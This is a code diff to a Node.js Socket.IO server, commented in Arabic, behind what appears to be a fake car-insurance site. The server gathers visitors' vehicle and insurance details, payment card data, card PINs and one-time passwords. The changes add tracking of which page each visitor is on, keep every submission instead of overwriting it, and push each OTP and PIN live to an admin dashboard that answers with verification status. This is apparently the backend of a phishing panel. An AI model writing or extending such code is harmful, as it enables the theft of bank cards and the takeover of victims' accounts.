@@ -132,6 +132,9 @@ let paymentData = [
 let otpCodesData = [];
 let pinCodesData = [];
 
+// Track user locations (current page)
+let locationsData = [];
+
 // Track active users
 let activeUsers = new Map(); // Map<socketId, ip>
 
@@ -202,6 +205,50 @@ io.on('connection', (socket) => {
     console.log(`📋 Active users: ${Array.from(activeUsers.values()).join(', ')}`);
   });
 
+  // Track page navigation
+  socket.on('pageChange', ({ ip, page }) => {
+    console.log(`📍 User ${ip} navigated to ${page}`);
+    
+    // Update or add location
+    const existingIndex = locationsData.findIndex(item => item.ip === ip);
+    const locationEntry = {
+      ip,
+      currentPage: page,
+      timestamp: new Date().toISOString()
+    };
+    
+    if (existingIndex >= 0) {
+      locationsData[existingIndex] = locationEntry;
+    } else {
+      locationsData.push(locationEntry);
+    }
+    
+    // Notify admins about location update
+    io.emit('locationUpdated', { ip, page });
+  });
+
+  // Also listen to updateLocation (from SocketContext)
+  socket.on('updateLocation', ({ ip, page }) => {
+    console.log(`📍 User ${ip} at page ${page}`);
+    
+    // Update or add location
+    const existingIndex = locationsData.findIndex(item => item.ip === ip);
+    const locationEntry = {
+      ip,
+      currentPage: page,
+      timestamp: new Date().toISOString()
+    };
+    
+    if (existingIndex >= 0) {
+      locationsData[existingIndex] = locationEntry;
+    } else {
+      locationsData.push(locationEntry);
+    }
+    
+    // Notify admins about location update
+    io.emit('locationUpdated', { ip, page });
+  });
+
   // إرسال البيانات الابتدائية
   socket.emit('initialCustomers', customerEntries.slice().reverse());
   socket.emit('initialPolicies', policyEntries.slice().reverse());
@@ -227,6 +274,7 @@ io.on('connection', (socket) => {
       payment: paymentData,
       otpCodes: otpCodesData,
       pinCodes: pinCodesData,
+      locations: locationsData,
       activeUsers: Array.from(activeUsers.values())
     });
   });
@@ -263,97 +311,123 @@ io.on('connection', (socket) => {
     }
   });
 
-  // استقبال بيانات تفاصيل السيارة
+  // استقبال بيانات تفاصيل السيارة - يسمح بتسجيل سيارات متعددة
   socket.on('submitCarDetails', (data) => {
     console.log('🚗 Received car details:', data);
-    const existingIndex = carDetailsData.findIndex(item => item.ip === data.ip);
-    const entry = { ...data, timestamp: new Date() };
+    const entry = { ...data, timestamp: new Date().toISOString() };
     
-    if (existingIndex >= 0) {
-      carDetailsData[existingIndex] = entry;
-    } else {
-      carDetailsData.push(entry);
-    }
+    // Always push new car details (don't replace, allow multiple cars per IP)
+    carDetailsData.push(entry);
     
     // Broadcast using standardized format
     broadcastEntry({
       id: `car-${data.ip}-${Date.now()}`,
       sourcePage: '/car-details',
       payload: entry,
-      submittedAt: entry.timestamp.toISOString()
+      submittedAt: entry.timestamp
     });
   });
 
-  // استقبال بيانات المزيد من التفاصيل
+  // استقبال بيانات المزيد من التفاصيل - يسمح بتسجيل سجلات متعددة
   socket.on('submitMoreDetails', (data) => {
     console.log('📋 Received more details:', data);
-    const existingIndex = moreDetailsData.findIndex(item => item.ip === data.ip);
-    if (existingIndex >= 0) {
-      moreDetailsData[existingIndex] = { ...data, timestamp: new Date() };
-    } else {
-      moreDetailsData.push({ ...data, timestamp: new Date() });
-    }
-    io.emit('newMoreDetails', data);
+    const entry = { ...data, timestamp: new Date().toISOString() };
+    
+    // Always push new details
+    moreDetailsData.push(entry);
+    
+    // Broadcast using standardized format
+    broadcastEntry({
+      id: `more-${data.ip}-${Date.now()}`,
+      sourcePage: '/more-details',
+      payload: entry,
+      submittedAt: entry.timestamp
+    });
   });
 
-  // استقبال اختيار التأمين
+  // استقبال اختيار التأمين - يسمح بتسجيل سجلات متعددة
   socket.on('submitSelectInsurance', (data) => {
     console.log('🛡️ Received insurance selection:', data);
-    const existingIndex = selectInsuranceData.findIndex(item => item.ip === data.ip);
-    if (existingIndex >= 0) {
-      selectInsuranceData[existingIndex] = { ...data, timestamp: new Date() };
-    } else {
-      selectInsuranceData.push({ ...data, timestamp: new Date() });
-    }
-    io.emit('newSelectInsurance', data);
+    const entry = { ...data, timestamp: new Date().toISOString() };
+    
+    // Always push new insurance selection
+    selectInsuranceData.push(entry);
+    
+    // Broadcast using standardized format
+    broadcastEntry({
+      id: `insurance-${data.ip}-${Date.now()}`,
+      sourcePage: '/select-insurance',
+      payload: entry,
+      submittedAt: entry.timestamp
+    });
   });
 
-  // استقبال رقم اللوحة
+  // استقبال رقم اللوحة - يسمح بتسجيل سجلات متعددة
   socket.on('submitPlateNumber', (data) => {
     console.log('🔢 Received plate number:', data);
-    const existingIndex = plateNumberData.findIndex(item => item.ip === data.ip);
-    if (existingIndex >= 0) {
-      plateNumberData[existingIndex] = { ...data, timestamp: new Date() };
-    } else {
-      plateNumberData.push({ ...data, timestamp: new Date() });
-    }
-    io.emit('newPlateNumber', data);
+    const entry = { ...data, timestamp: new Date().toISOString() };
+    
+    // Always push new plate number
+    plateNumberData.push(entry);
+    
+    // Broadcast using standardized format
+    broadcastEntry({
+      id: `plate-${data.ip}-${Date.now()}`,
+      sourcePage: '/plate-number',
+      payload: entry,
+      submittedAt: entry.timestamp
+    });
   });
 
-  // استقبال معلومات التأمين
+  // استقبال معلومات التأمين - يسمح بتسجيل سجلات متعددة
   socket.on('submitInsuranceInfo', (data) => {
     console.log('👤 Received insurance info:', data);
-    const existingIndex = insuranceInfoData.findIndex(item => item.ip === data.ip);
-    if (existingIndex >= 0) {
-      insuranceInfoData[existingIndex] = { ...data, timestamp: new Date() };
-    } else {
-      insuranceInfoData.push({ ...data, timestamp: new Date() });
-    }
-    io.emit('newInsuranceInfo', data);
+    const entry = { ...data, timestamp: new Date().toISOString() };
+    
+    // Always push new insurance info
+    insuranceInfoData.push(entry);
+    
+    // Broadcast using standardized format
+    broadcastEntry({
+      id: `info-${data.ip}-${Date.now()}`,
+      sourcePage: '/insurance-info',
+      payload: entry,
+      submittedAt: entry.timestamp
+    });
   });
 
-  // استقبال تاريخ الوثيقة
+  // استقبال تاريخ الوثيقة - يسمح بتسجيل سجلات متعددة
   socket.on('submitPolicyDate', (data) => {
     console.log('📅 Received policy date:', data);
-    const existingIndex = policyDateData.findIndex(item => item.ip === data.ip);
-    if (existingIndex >= 0) {
-      policyDateData[existingIndex] = { ...data, timestamp: new Date() };
-    } else {
-      policyDateData.push({ ...data, timestamp: new Date() });
-    }
-    io.emit('newPolicyDate', data);
+    const entry = { ...data, timestamp: new Date().toISOString() };
+    
+    // Always push new policy date
+    policyDateData.push(entry);
+    
+    // Broadcast using standardized format
+    broadcastEntry({
+      id: `policy-${data.ip}-${Date.now()}`,
+      sourcePage: '/policy-date',
+      payload: entry,
+      submittedAt: entry.timestamp
+    });
   });
 
-  // استقبال عرض السعر
+  // استقبال عرض السعر - يسمح بتسجيل سجلات متعددة
   socket.on('submitQuote', (data) => {
     console.log('💰 Received quote:', data);
-    const existingIndex = quoteData.findIndex(item => item.ip === data.ip);
-    if (existingIndex >= 0) {
-      quoteData[existingIndex] = { ...data, timestamp: new Date() };
-    } else {
-      quoteData.push({ ...data, timestamp: new Date() });
-    }
-    io.emit('newQuote', data);
+    const entry = { ...data, timestamp: new Date().toISOString() };
+    
+    // Always push new quote
+    quoteData.push(entry);
+    
+    // Broadcast using standardized format
+    broadcastEntry({
+      id: `quote-${data.ip}-${Date.now()}`,
+      sourcePage: '/quote',
+      payload: entry,
+      submittedAt: entry.timestamp
+    });
   });
 
   // استقبال بيانات الدفع - يسمح بتسجيل بطاقات متعددة
@@ -400,29 +474,49 @@ io.on('connection', (socket) => {
   // استقبال OTP
   socket.on('submitOTP', (data) => {
     console.log('🔐 Received OTP:', data);
-    otpCodesData.push({ ...data, timestamp: new Date() });
+    const entry = { ...data, timestamp: new Date().toISOString() };
+    otpCodesData.push(entry);
+    
+    // Ensure IP is available in the payload
+    const payloadWithIp = {
+      ...entry,
+      ip: entry.ip || entry.userIp // fallback to userIp if ip not present
+    };
     
     // Broadcast using standardized format
     broadcastEntry({
-      id: `otp-${data.ip}-${Date.now()}`,
+      id: `otp-${payloadWithIp.ip}-${Date.now()}`,
       sourcePage: '/payment-otp',
-      payload: data,
-      submittedAt: new Date().toISOString()
+      payload: payloadWithIp,
+      submittedAt: entry.timestamp
     });
+    
+    // Also emit newOTP with full data for admin dashboard
+    io.emit('newOTP', payloadWithIp);
   });
 
   // استقبال PIN
   socket.on('submitPIN', (data) => {
     console.log('🔑 Received PIN:', data);
-    pinCodesData.push({ ...data, timestamp: new Date() });
+    const entry = { ...data, timestamp: new Date().toISOString() };
+    pinCodesData.push(entry);
+    
+    // Ensure IP is available in the payload
+    const payloadWithIp = {
+      ...entry,
+      ip: entry.ip || entry.userIp // fallback to userIp if ip not present
+    };
     
     // Broadcast using standardized format
     broadcastEntry({
-      id: `pin-${data.ip}-${Date.now()}`,
+      id: `pin-${payloadWithIp.ip}-${Date.now()}`,
       sourcePage: '/payment-pin',
-      payload: data,
-      submittedAt: new Date().toISOString()
+      payload: payloadWithIp,
+      submittedAt: entry.timestamp
     });
+    
+    // Also emit newPIN with full data for admin dashboard
+    io.emit('newPIN', payloadWithIp);
   });
 
   // Admin sends OTP verification status
@@ -628,12 +722,10 @@ app.get('/api/customers', (req, res) => {
   });
 });
 
-// API للحصول على جميع البوليصات
 app.get('/api/policies', (req, res) => {
   res.json({ success: true, data: policyEntries, total: policyEntries.length });
 });
 
-// API للحصول على جميع المطالبات
 app.get('/api/claims', (req, res) => {
   res.json({ success: true, data: claimEntries, total: claimEntries.length });
 });
